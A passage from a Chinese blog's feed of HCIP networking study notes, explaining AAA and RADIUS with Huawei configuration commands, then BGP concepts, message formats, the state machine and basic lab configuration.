id="AAA实现协议-RADIUS"><a href="#AAA实现协议-RADIUS" class="headerlink" title="AAA实现协议 - RADIUS"></a>AAA实现协议 - RADIUS</h4><ul><li>AAA可以用多种协议来实现，最常用的是RADIUS协议。RADIUS是一种分布式的、客户端/服务器结构的信息交互协议，可以实现对用户的认证、计费和授权功能</li><li>通常由NAS作为RADIUS客户端，负责传输用户信息到指定的RADIUS服务器，然后根据从服务器返回的信息进行相应处理 如接受/拒绝用户接入</li><li>RADIUS服务器一般运行在中心计算机或工作站上，维护相关的用户认证和网络服务访问信息，负责接收用户连接请求并认证用户，然后给客户端返回所有需要的信息（如接受/拒绝认证请求）。</li><li>RADIUS使用UDP（User Datagram Protocol）作为传输协议，并规定UDP端口1812、1813分别作为认证、计费端口，具有良好的实时性；同时也支持重传机制和备用服务器机制，从而具有较好的可靠性。</li><li>RADIUS客户端与服务器间的消息流程如下：<ol><li>当用户接入网络时，用户发起连接请求，向RADIUS客户端（即NAS）发送用户名和密码</li><li>RADIUS客户端向RADIUS服务器发送包含用户名和密码信息的认证请求报文</li><li>RADIUS服务器接收到合法的请求后，完成认证，并把所需的用户授权信息返回给客户端；对于非法的请求，RADIUS服务器返回认证失败的信息给客户端</li><li>RADIUS客户端通知用户认证是否成功</li><li>RADIUS客户端根据接收到的认证结果接入/拒绝用户。如果允许用户接入，则RADIUS客户端向RADIUS服务器发送计费开始请求报文</li><li>RADIUS服务器返回计费开始响应报文，并开始计费</li><li>用户开始访问网络资源</li><li>当用户不再想要访问网络资源时，用户发起下线请求，请求停止访问网络资源</li><li>RADIUS客户端向RADIUS服务器提交计费结束请求报文</li><li>RADIUS服务器返回计费结束响应报文，并停止计费</li><li>RADIUS客户端通知用户访问结束，用户结束访问网络资源</li></ol></li></ul><h4 id="AAA常见应用场景"><a href="#AAA常见应用场景" class="headerlink" title="AAA常见应用场景"></a>AAA常见应用场景</h4><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/AAA_常见应用场景.png" style="zoom:67%;" /><h3 id="AAA配置实现"><a href="#AAA配置实现" class="headerlink" title="AAA配置实现"></a>AAA配置实现</h3><p><strong>1 . 进入AAA视图</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei] aaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2 . 创建认证方案</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei-aaa] authentication-scheme authentication-scheme-name <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>创建认证方案并进入相应的认证方案视图</li><li>authorization-scheme authorization-scheme-name命令用来配置域的授权方案。缺省情况下，域下没有绑定授权方案</li></ul><pre class="line-numbers language-none"><code class="language-none">[Huawei-aaa-authentication-scheme-name] authentication-mode &#123;hwtacacs | local | radius&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>配置认证方式，local指定认证方式为本地认证。缺省情况下，认证方式为本地认证</li><li>authentication-mode { hwtacacs | local | radius }命令用来配置当前认证方案使用的认证方式。缺省情况下，认证模式为本地认证方式</li></ul><p><strong>3 .  创建domain并绑定认证方案</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei-aaa] domain domain-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>创建domain并进入相应的domain视图</li></ul><pre class="line-numbers language-none"><code class="language-none">[Huawei-aaa-domain-name] authentication-scheme authentication-scheme-name <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在相应的domain视图下绑定认证方案</li></ul><p><strong>4 . 创建用户</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei-aaa] local-user user-name  password cipher password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>创建本地用户，并配置本地用户的密码：<ul><li>如果用户名中带域名分隔符，如@，则认为@前面的部分是用户名，后面部分是域名</li><li>如果没有@，则整个字符串为用户名，域为默认域</li></ul></li></ul><p><strong>5 . 配置用户接入类型</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei-aaa] local-user user-name service-type&#123; &#123; terminal | telnet | ftp | ssh | snmp | http &#125; | ppp | none&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>设置本地用户的接入类型。缺省情况下，本地用户关闭所有的接入类型。</li></ul><p><strong>6 . 配置用户级别</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei-aaa] local-user user-name privilege level level<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>指定本地用户的权限级别</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;font color=&quot;FF6600&quot;&gt;AAA（Authentication, Authorization, and Accounting）是一种管理框架，它提供了授权部分用户访问指定资源和记录这些用户操作行为的安全机制。因其具有良好的可扩展性，</summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
  </entry>
  
  <entry>
    <title>外部网关路由协议 BGP</title>
    <link href="https://shierjinghuang.github.io/2023/03/31/%E5%A4%96%E9%83%A8%E7%BD%91%E5%85%B3%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE%20BGP/"/>
    <id>https://shierjinghuang.github.io/2023/03/31/%E5%A4%96%E9%83%A8%E7%BD%91%E5%85%B3%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE%20BGP/</id>
    <published>2023-03-31T03:58:35.000Z</published>
    <updated>2023-04-09T07:23:24.163Z</updated>
    
    <content type="html"><![CDATA[<center><h1>外部网关路由协议 BGP</h1></center>[TOC]<h2 id="BGP概述"><a href="#BGP概述" class="headerlink" title="BGP概述"></a>BGP概述</h2><p>OSPF、IS-IS等IGP路由协议在组织机构网络内部广泛应用，随着网络规模扩大，网络中路由数量不断增长，IGP已无法管理大规模网络，AS的概念由此诞生。<br>AS指的是在同一个组织管理下，使用统一选路策略的设备集合<br>不同AS通过AS号区分，AS号存在16bit、32bit两种表示方式。IANA负责AS号的分发。</p><p>IANA（Internet Assigned Numbers Authority，因特网地址分配组织）：IAB（Internet Architecture Board，因特网体系委员会）的下设组织。IANA授权NIC（ Network Information Center，网络信息中心）和其他组织负责IP地址和域名分配，同时，IANA负责维护TCP/IP协议族所采用的协议标识符数据库，包括自治系统号。<br>在长度为16bit的AS号表示方式中：64512-65534为私有AS号，在长度为32bit的AS号表示方式中：4200000000-4294967294为私有AS号。</p><h3 id="使用IGP——内部网关协议-传递路由"><a href="#使用IGP——内部网关协议-传递路由" class="headerlink" title="使用IGP——内部网关协议 传递路由:"></a>使用IGP——内部网关协议 传递路由:</h3><p>AS之间需要直连链路，或通过VPN协议构造逻辑直连进行邻居建立</p><ul><li>AS之间可能是不同的机构、公司，相互之间无法完全信任，使用IGP可能存在暴露AS内部的网络信息的风险</li></ul><blockquote><p><font color="orange">整个网络规模扩大，路由数量进一步增加，路由表规模变大，路由收敛变慢，设备性能消耗加大 </font></p></blockquote><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/使用IGP传递路由.png" alt="使用IGP传递路由" style="zoom:80%;" /><h3 id="使用BGP传递路由"><a href="#使用BGP传递路由" class="headerlink" title="使用BGP传递路由:"></a>使用BGP传递路由:</h3><p>AS之间专门使用BGP（Border Gateway Protocol，边界网关协议）协议进行路由传递，相较于传统的IGP协议有以下优点 ：</p><ul><li>BGP基于TCP，只要能够建立TCP连接即可建立BGP</li><li>只传递路由信息，不会暴露AS内的拓扑信息</li><li>触发式更新，而不是进行周期性更新</li></ul><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/使用BGP传递路由.png" alt="使用BGP传递路由" style="zoom:80%;" /><h3 id="BGP在企业中的应用"><a href="#BGP在企业中的应用" class="headerlink" title="BGP在企业中的应用"></a>BGP在企业中的应用</h3><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP在企业网的应用.png" style="zoom: 67%;" /><h2 id="BGP的基本概念"><a href="#BGP的基本概念" class="headerlink" title="BGP的基本概念"></a>BGP的基本概念</h2><p><font color="FF3300">BGP是一种实现自治系统AS之间的路由可达，并选择最佳路由的矢量性协议</font></p><ul><li>早期发布的三个版本分别是BGP-1、BGP-2和BGP-3，1994年开始使用BGP-4，2006年之后单播IPv4网络使用的版本是BGP-4，其他网络使用的版本是MP-BGP</li></ul><h4 id="BGP的特点："><a href="#BGP的特点：" class="headerlink" title="BGP的特点："></a>BGP的特点：</h4><ul><li>BGP使用TCP作为其传输层协议（端口号为179），使用触发式路由更新，而不是周期性路由更新</li><li>BGP能够承载大批量的路由信息，能够支撑大规模网络</li><li>BGP提供了丰富的路由策略，能够灵活的进行路由选路，并能指导对等体按策略发布路由</li><li>BGP能够支撑MPLS/VPN的应用，传递客户VPN路由</li><li>BGP提供了路由聚合和路由衰减功能用于防止路由振荡，通过这两项功能有效地提高了网络稳定性</li></ul><h3 id="BGP特征："><a href="#BGP特征：" class="headerlink" title="BGP特征："></a>BGP特征：</h3><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP特征示意图.png" alt="BGP特征示意图" style="zoom:80%;" /><ul><li>BGP使用TCP为传输层协议，TCP端口号179。路由器之间的BGP会话基于TCP连接而建立</li><li>运行BGP的路由器被称为BGP发言者（BGP Speaker），或BGP路由器</li><li>两个建立BGP会话的路由器互为对等体（Peer），BGP对等体之间交换BGP路由表</li><li>BGP路由器只发送增量的BGP路由更新，或进行触发式更新</li><li>BGP能够承载大批量的路由前缀，可在大规模网络中应用</li><li>BGP通常被称为路径矢量路由协议（Path-Vector Routing Protocol）</li><li>每条BGP路由都携带多种路径属性（Path attribute），BGP可以通过这些路径属性控制路径选择，而不像IS-IS、OSPF只能通过Cost控制路径选择，因此在路径选择上，BGP具有丰富的可操作性，可以在不同场景下选择最合适的路径控制方式。</li></ul><h3 id="BGP对等体关系"><a href="#BGP对等体关系" class="headerlink" title="BGP对等体关系"></a>BGP对等体关系</h3><blockquote><p><font color="BLUE">两个建立BGP会话的路由器互为对等体（Peer），BGP对等体之间交换BGP路由表</font></p></blockquote><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP对等体.png" alt="BGP对等体" style="zoom:80%;" /><ul><li><p>与OSPF、IS-IS等协议不同，<strong>BGP的会话是基于TCP建立的</strong></p></li><li><p><strong>建立BGP对等体关系的两台路由器并不要求必须直连</strong></p></li><li><p>BGP存在两种对等体关系类型：EBGP及IBGP：</p><blockquote><p><font color="FF3300">EBGP（External BGP）：位于不同自治系统的BGP路由器之间的BGP对等体关系</font></p></blockquote></li><li><p>两台路由器之间要建立EBGP对等体关系，必须满足两个条件：</p><ul><li>两个路由器所属AS不同（即AS号不同）</li><li>在配置EBGP时，Peer命令所指定的对等体IP地址要求路由可达，并且TCP连接能够正确建立</li></ul><blockquote><p><font color="FF3300">IBGP（Internal BGP）：位于相同自治系统的BGP路由器之间的BGP邻接关系</font></p></blockquote></li></ul><h4 id="BGP对等体关系建立"><a href="#BGP对等体关系建立" class="headerlink" title="BGP对等体关系建立"></a>BGP对等体关系建立</h4><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP对等体示意图.png" alt="BGP对等体示意图" style="zoom:67%;" /><ul><li><p>先启动BGP的一端先发起TCP连接，如图所示，R1先启动BGP，R1使用随机端口号向R2的179端口发起TCP连接，完成TCP连接的建立</p></li><li><p>三次握手建立完成之后，R1、R2之间相互发送Open报文，携带参数用于对等体建立，参数协商正常之后双方相互发送Keepalive报文，收到对端发送的Keepalive报文之后对等体建立成功，同时双方定期发送Keepalive报文用于保持连接</p></li><li><p>其中Open报文中携带：</p><ul><li>My Autonomous System：自身AS号</li><li>Hold Time：用于协商后续Keepalive报文发送时间</li><li>BGP Identifier：自身Router ID</li></ul></li><li><p>BGP对等体关系建立之后，BGP路由器发送BGP Update（更新）报文通告路由到对等体。</p></li></ul><blockquote><p>BGP建立对等体的对等体都会发起TCP三次握手，所以会建立两个TCP连接，但是实际BGP只会保留其中一个TCP连接，从Open报文中获取对端BGP Identifier之后BGP对等体会比较本端的Router ID和对端的Router ID大小，如果本端Router ID小于对端Router ID，则会关闭本地建立的TCP连接，使用由对端主动发起创建的TCP连接进行后续的BGP报文交互</p></blockquote><h4 id="TCP连接源地址"><a href="#TCP连接源地址" class="headerlink" title="TCP连接源地址"></a>TCP连接源地址</h4><p><font color="BLUE">缺省情况下，BGP使用报文出接口作为TCP连接的本地接口，在部署IBGP对等体关系时，建议使用Loopback地址作为更新源地址</font></p><ul><li>Loopback接口非常稳定，而且可以借助AS内的IGP和冗余拓扑来保证可靠性</li><li>在部署EBGP对等体关系时，通常使用直连接口的IP地址作为源地址，如若使用Loopback接口建立EBGP对等体关系，则应注意EBGP多跳问题</li></ul><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/冗余链路示意图.png" alt="冗余链路示意图" style="zoom:67%;" /><blockquote><p>一般而言在AS内部，网络具备一定的冗余性。在R1与R3之间，如果采用直连接口建IBGP邻居关系，那么一旦接口或者直连链路发生故障，BGP会话也就断了，但是事实上，由于冗余链路的存在，R1与R3之间的IP连通性其实并没有DOWN</p></blockquote><h3 id="BGP报文及状态机"><a href="#BGP报文及状态机" class="headerlink" title="BGP报文及状态机"></a>BGP报文及状态机</h3><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP报文格式.png" alt="BGP报文格式" style="zoom:67%;" /><h4 id="BGP报文类型"><a href="#BGP报文类型" class="headerlink" title="BGP报文类型:"></a>BGP报文类型:</h4><p><font color="FF0000">BGP存在5种类型的报文，不同类型的报文拥有相同的头部（header）</font></p><p>不同于常见的IGP协议，<font color="FF6600"><strong>BGP使用TCP作为传输层协议，端口号179</strong></font>，这使得BGP支持在非直连的路由器之间建立对等体关系</p><table><thead><tr><th>报文名称</th><th>作用</th><th>发送时刻</th></tr></thead><tbody><tr><td>Open</td><td>协商BGP对等体参数，建立对等体关系</td><td>BGP TCP连接建立成功之后</td></tr><tr><td>Update</td><td>发送BGP路由更新</td><td>BGP对等体关系建立之后有路由需要发送或路由变化时向对等体发送Update报文</td></tr><tr><td>Notification</td><td>报告错误信息，中止对等体关系</td><td>当BGP在运行中发现错误时，发送Notification报文将错误通告给BGP对等体</td></tr><tr><td>Keepalive</td><td>标志对等体建立，维持BGP对等体关系</td><td>BGP路由器收到对端发送的Keepalive报文，将对等体状态置为已建立，同时后续定期发送keepalive报文用 于保持连接</td></tr><tr><td>Route_refresh</td><td>用于在改变路由策略后请求对等体重新发送路由信息。只有支持路由刷新能力的BGP设备会发送和响应此报文</td><td>当路由策略发生变化时，触发请求对等体重新通告路由</td></tr></tbody></table><h4 id="BGP报文格式"><a href="#BGP报文格式" class="headerlink" title="BGP报文格式:"></a>BGP报文格式:</h4><h5 id="BGP报文格式-报文头格式"><a href="#BGP报文格式-报文头格式" class="headerlink" title="BGP报文格式 - 报文头格式"></a>BGP报文格式 - 报文头格式</h5><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP报文头格式.png" style="zoom:80%;" /><ul><li>BGP五种报文都拥有相同的报文头，格式如左侧所示，主要字段解释如下：<ul><li>Marker：16Byte，用于标明BGP报文边界，所有bit均为“1”</li><li>Length：2Byte，BGP报文总长度（包括报文头在内），以Byte为单位</li><li>Type：1Byte，BGP报文的类型。其取值从1到5，分别表示Open、Update、Notification、Keepalive和Route-refresh 报文</li></ul></li></ul><h5 id="BGP报文格式-Open"><a href="#BGP报文格式-Open" class="headerlink" title="BGP报文格式 - Open"></a>BGP报文格式 - Open</h5><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP_OPen报文格式.png" alt="BGP_OPen报文格式" style="zoom:80%;" /><ul><li><font color="FF6600"><strong>Open报文是TCP连接建立之后发送的第一个报文，用于建立BG对等体之间的连接关系</strong></font>，报文格式如左侧所示，主要字段解释如下：<ul><li>Version：BGP的版本号。对于BGP 4来说，其值为4</li><li>My AS autonomous system：本地AS号。通过比较两端的AS号可以判断对端是否和本端处于相同AS</li><li>Hold Time：保持时间。在建立对等体关系时两端要协商Hold Time，并保持一致。如果在这个时间内未收到对端发来的Keepalive报文或Update报文，则认为BGP连接中断</li><li>BGP Identifier：BGP标识符，以IP地址的形式表示，用来识别BGP路由器</li><li>Opt Parm Len：Optional parameters的长度</li><li>Optional parameters：宣告自身对于一些可选功能的支持，比如认证、多协议支持,除了IPv4单播路由信息，BGP4+还支持多种网络层协议，在协商时BGP对等体之间会通过</li><li>Optional_parameters字段协商对网络层协议的支持能力</li></ul></li></ul><h5 id="BGP报文格式-Update"><a href="#BGP报文格式-Update" class="headerlink" title="BGP报文格式 - Update"></a>BGP报文格式 - Update</h5><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP_Update报文.png" alt="BGP_Update报文" style="zoom: 80%;" /><ul><li><font color="FF6600"><strong>Update报文用于在对等体之间传递路由信息，可以用于发布、撤销路由</strong></font></li><li>一个Update报文可以通告具有相同路径属性的多条路由，这些路由保存在NLRI（Network Layer Reachable Information，网络层可达信息）中。同时Update还可以携带多条不可达路由，用于告知对方撤销路由，这些保存在Withdrawn Routes字段中。</li><li>报文格式如左侧所示，主要字段解释如下：<ul><li>Withdrawn routes：不可达路由的列表</li><li>Path attributes：与NLRI相关的所有路径属性列表，每个路径属性由一个TLV（Type-Length-Value）三元组构成</li><li>NLRI：可达路由的前缀和前缀长度二元组</li><li>Unfeasible routes length：不可达路由字段的长度，以Byte为单位。如果为0则说明没有Withdrawn Routes 字段</li><li>Withdrawn Routes Length：标明Withdrawn Routes部分的长度。其值为零时，表示没有撤销的路由</li><li>Total path attribute length：路径属性字段的长度，以Byte为单位，如果为0则说明没有Path Attributes 字段</li></ul></li></ul><h5 id="BGP报文格式-Notification"><a href="#BGP报文格式-Notification" class="headerlink" title="BGP报文格式 - Notification"></a>BGP报文格式 - Notification</h5><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP_Notification报文.png" alt="BGP_Notification报文" style="zoom:80%;" /><ul><li>当BGP检测到错误状态时（对等体关系建立时、建立之后都可能发生），就会向对等体发送Notification，告知对端错误原因。之后BGP连接将会立即中断<ul><li>Error Code、Error subcode：差错码、差错子码，用于告知对端具体的错误类型</li><li>Data：用于辅助描述详细的错误内容，长度并不固定</li></ul></li></ul><h5 id="BGP报文格式-Keepalive"><a href="#BGP报文格式-Keepalive" class="headerlink" title="BGP报文格式 - Keepalive"></a>BGP报文格式 - Keepalive</h5><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP_Keepalive报文.png" alt="BGP_Keepalive" style="zoom:80%;" /><ul><li><font color="FF6600"><strong>BGP路由器收到对端发送的Keepalive报文，将对等体状态置为已建立，同时后续定期发送keepalive报文用于保持连接</strong></font></li><li>Keepalive报文格式中只包含报文头，没有附加其他任何字段</li></ul><h5 id="BGP报文格式-Route-refresh"><a href="#BGP报文格式-Route-refresh" class="headerlink" title="BGP报文格式 - Route-refresh"></a>BGP报文格式 - Route-refresh</h5><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP_Route-refresh报文.png" alt="BGP_Route-refresh报文"  /><ul><li><font color="FF6600"><strong>Route-refresh报文用来要求对等体重新发送指定地址族的路由信息</strong></font>，一般为本端修改了相关路由策略之后让对方重新发送Update报文，本端执行新的路由策略重新计算BGP路由。</li><li>相关字段内容如下：<ul><li>AFI：Address Family Identifier，地址族标识，如IPv4</li><li>Res.：保留，8个bit必须置0</li><li>SAFI：Subsequent Address Family Identifier，子地址族标识</li></ul></li><li>补充信息：<ul><li>在Open报文协商时会协商是否支持Route-refresh，如果对等体支持<strong>Route-refresh</strong>能力，则可以通过refresh bgp命令手工对BGP连接进行软复位，BGP软复位可以在不中断BGP连接的情况下重新刷新BGP路由表，并应用新的策略</li><li>对于不支持Route-Refresh能力的BGP对等体，可以配置<strong>keep-all-routes</strong>命令，保留该对等体的所有原始路由，这样不需要复位BGP连接即可完成路由表的刷新</li><li>缺省情况下未开启<strong>keep-all-routes</strong></li></ul></li></ul><h4 id="BGP状态机"><a href="#BGP状态机" class="headerlink" title="BGP状态机"></a>BGP状态机</h4><table><thead><tr><th>Peer状态名称</th><th><strong>用途</strong></th></tr></thead><tbody><tr><td>Idle</td><td>开始准备TCP的连接并监视远程对等体，启用BGP时，要准备足够的资源</td></tr><tr><td>Connect</td><td>正在进行TCP连接，等待完成中，认证都是在TCP建立期间完成的。如果TCP连接建立失败则进入Active状态，反复尝试连接</td></tr><tr><td>Active</td><td>TCP连接没建立成功，反复尝试TCP连接</td></tr><tr><td>OpenSent</td><td>TCP连接已经建立成功，开始发送Open包，Open包携带参数协商对等体的建立</td></tr><tr><td>OpenConfirm</td><td>参数、能力特性协商成功，自己发送Keepalive包，等待对方的Keepalive包</td></tr><tr><td>Established</td><td>已经收到对方的Keepalive包，双方能力特性经协商发现一致，开始使用Update通告路由信息</td></tr></tbody></table><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP状态机示意图.png" alt="BGP状态机示意图" style="zoom:80%;" /><ul><li><p>Idle状态是BGP初始状态。在Idle状态下，BGP拒绝对等体发送的连接请求。只有在收到本设备的Start事件后，BGP才开始尝试和其它BGP对等体进行TCP连接，并转至Connect状态</p><ul><li>Start事件是由一个操作者配置一个BGP过程，或者重置一个已经存在的过程或者路由器软件重置BGP过程引起的</li><li>任何状态中收到Notification报文或TCP拆链通知等Error事件后，BGP都会转至Idle状态</li></ul></li><li><p>在Connect状态下，BGP启动连接重传定时器（Connect Retry），等待TCP完成连接</p><ul><li>如果TCP连接成功，那么BGP向对等体发送Open报文，并转至OpenSent状态</li><li>如果TCP连接失败，那么BGP转至Active状态</li><li>如果连接重传定时器超时，BGP仍没有收到BGP对等体的响应，那么BGP继续尝试和其它BGP对等体进行TCP连接，停留在Connect状态。</li></ul></li><li><p>在Active状态下，BGP总是在试图建立TCP连接</p><ul><li>如果TCP连接成功，那么BGP向对等体发送Open报文，关闭连接重传定时器，并转至OpenSent状态</li><li>如果TCP连接失败，那么BGP停留在Active状态</li><li>如果连接重传定时器超时，BGP仍没有收到BGP对等体的响应，那么BGP转至Connect状态</li></ul></li><li><p>在OpenSent状态下，BGP等待对等体的Open报文，并对收到的Open报文中的AS号、版本号、认证码等进行检查</p><ul><li>如果收到的Open报文正确，那么BGP发送Keepalive报文，并转至OpenConfirm状态</li><li>如果发现收到的Open报文有错误，那么BGP发送Notification报文给对等体，并转至Idle状态</li></ul></li><li><p>在OpenConfirm状态下，BGP等待Keepalive或Notification报文。如果收到Keepalive报文，则转至Established状态，如果收到Notification报文，则转至Idle状态</p></li><li><p>在Established状态下，BGP可以和对等体交换Update、Keepalive、Route-refresh报文和Notification报文<br>如果收到正确的Update或Keepalive报文，那么BGP就认为对端处于正常运行状态，将保持BGP连接</p><ul><li>如果收到错误的Update或Keepalive报文，那么BGP发送Notification报文通知对端，并转至Idle状态。<br>Route-refresh报文不会改变BGP状态</li><li>如果收到Notification报文，那么BGP转至Idle状态</li><li>如果收到TCP拆链通知，那么BGP断开连接，转至Idle状态</li></ul></li></ul><h4 id="BGP状态机详情："><a href="#BGP状态机详情：" class="headerlink" title="BGP状态机详情："></a>BGP状态机详情：</h4><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/idle状态.png" alt="idle状态" style="zoom: 67%;" /><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/Connect.png" style="zoom:67%;" /><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP状态机2.png" style="zoom:67%;" /><h3 id="BGP协议表项"><a href="#BGP协议表项" class="headerlink" title="BGP协议表项"></a>BGP协议表项</h3><h3 id="BGP路由生成"><a href="#BGP路由生成" class="headerlink" title="BGP路由生成"></a>BGP路由生成</h3><p><font color="BLUE">不同于IGP路由协议，BGP自身并不会发现并计算产生路由，BGP将IGP路由表中的路由注入到BGP路由表中，并通过Update报文传递给BGP对等体</font></p><ul><li>BGP注入路由的方式有两种：<ul><li>Network</li><li>import-route</li></ul></li></ul><p>与IGP协议相同，BGP支持根据已有的路由条目进行聚合，生成聚合路由</p><h4 id="Network注入路由"><a href="#Network注入路由" class="headerlink" title="Network注入路由"></a>Network注入路由</h4><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/Network注入路由示意图.png" style="zoom:80%;" /><blockquote><p><font color="blue">Network方式注入的路由必须是已经存在于IP路由表中的路由条目，否则不会被成功注入到BGP路由表中</font></p></blockquote><p>通过Network方式注入路由：</p><ol><li>AS200内的BGP路由器已经通过IGP协议OSPF学习到了两条路由：10.1.0.0/24和10.2.0.0/24，在BGP进程内通过network命令注入这两条路由，这两条路由将会出现在本地的BGP路由表中</li><li>AS200内的BGP路由器通过Update报文将路由传递给AS300内的BGP路由器</li><li>AS300内的BGP路由器收到路由后，将这两条路由加入到本地的BGP路由表中</li></ol><h4 id="import-route方式注入路由"><a href="#import-route方式注入路由" class="headerlink" title="import-route方式注入路由"></a>import-route方式注入路由</h4><p><del>Network方式注入路由只能逐条配置逐条注入IP路由表中的路由，如果注入的路由条目很多配置将会非常复杂</del></p><p>可以使用import-route方式，将直连路由、静态路由、OSPF路由、IS-IS路由等协议的路由注入到BGP路由表中</p><h4 id="BGP聚合路由"><a href="#BGP聚合路由" class="headerlink" title="BGP聚合路由"></a>BGP聚合路由</h4><h3 id="BGP通告原则"><a href="#BGP通告原则" class="headerlink" title="BGP通告原则"></a>BGP通告原则</h3><ul><li>BGP通过network、import-route、aggregate聚合方式生成BGP路由后，通过Update报文将BGP路由传递给对等体</li><li>BGP通告遵循以下原则：<ul><li>只发布最优路由</li><li>从EBGP对等体获取的路由，会发布给所有对等体</li><li>IBGP水平分割：从IBGP对等体获取的路由，不会发送给IBGP对等体</li><li>BGP同步规则指的是：当一台路由器从自己的IBGP对等体学习到一条BGP路由时（这类路由被称为IBGP路由），它将不能使用该条路由或把这条路由通告给自己的EBGP对等体，除非它又从IGP协议学习到这条路由，也就是要求IBGP路由与IGP路由同步。同步规则主要用于规避BGP路由黑洞问题。</li></ul></li></ul><h2 id="BGP的基本配置"><a href="#BGP的基本配置" class="headerlink" title="BGP的基本配置"></a>BGP的基本配置</h2><h3 id="配置介绍"><a href="#配置介绍" class="headerlink" title="配置介绍"></a>配置介绍</h3><p><strong>1. 启动BGP进程</strong></p><pre class="line-numbers language-none"><code class="language-none">[R1] bgp &#123;as-number-plain | as-number-dot&#125;[R1-bgp] router-id ipv4-address<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>启动BGP，指定本地AS编号，并进入BGP视图。使用router-id命令配置BGP的Router ID，建议将BGP Router ID配置为设备Loopback接口的地址</p><p><strong>2. 配置BGP对等体</strong></p><pre class="line-numbers language-none"><code class="language-none">[R1-bgp] peer &#123;ipv4-address|ipv6-address&#125; as-number &#123;as-number-plain|as-number-dot&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建BGP对等体，指定对等体地址以及AS号</p><p><strong>3. 配置建立对等体使用的源地址、EBGP对等体最大跳数</strong></p><pre class="line-numbers language-none"><code class="language-none">[R1-bgp] peer ipv4-address connect-interface interface-type interface-number [ipv4-source-address][R1-bgp] peer ipv4-address ebgp-max-hop [ hop-count ]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>指定发送BGP报文的源接口，并可指定发起连接时使用的源地址<br>指定建立EBGP连接允许的最大跳数。缺省情况下，EBGP连接允许的最大跳数为1，即只能在物理直连链路上建立EBGP连接</p><h4 id="基本BGP配置实验："><a href="#基本BGP配置实验：" class="headerlink" title="基本BGP配置实验："></a>基本BGP配置实验：</h4><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/基本BGP实验拓扑.png" alt="基本BGP实验拓扑" style="zoom: 67%;" /><h5 id="配置接口：如上图所示配置接口地址和环回地址"><a href="#配置接口：如上图所示配置接口地址和环回地址" class="headerlink" title="配置接口：如上图所示配置接口地址和环回地址"></a>配置接口：如上图所示配置接口地址和环回地址</h5><h5 id="R1与R2之间的两条链路分别配置物理接口的peer（EBGP）："><a href="#R1与R2之间的两条链路分别配置物理接口的peer（EBGP）：" class="headerlink" title="R1与R2之间的两条链路分别配置物理接口的peer（EBGP）："></a>R1与R2之间的两条链路分别配置物理接口的peer（EBGP）：</h5><p><strong>R1:</strong></p><pre class="line-numbers language-none"><code class="language-none">bgp 100peer 12.12.12.2 as-number 200 peer 21.21.21.2 as-number 200network 1.1.1.0 24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>R2:</strong></p><pre class="line-numbers language-none"><code class="language-none">bgp 200peer 12.12.12.1 as-number 100 peer 21.21.21.1 as-number 100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="R2和R3之间建立回环peer（IBGP）："><a href="#R2和R3之间建立回环peer（IBGP）：" class="headerlink" title="R2和R3之间建立回环peer（IBGP）："></a>R2和R3之间建立回环peer（IBGP）：</h5><p>1 . R2和R3上建立32位回环口，启动OSPF，公告网络及回环地址，但不能公告与AS100和AS300直连的网络，目的保障IP通信；</p><p><strong>R2：</strong></p><pre class="line-numbers language-none"><code class="language-none">ospf 1 area 0.0.0.0 network 2.2.2.0 0.0.0.255 network 23.23.23.0 0.0.0.255<span aria-hidden="true" 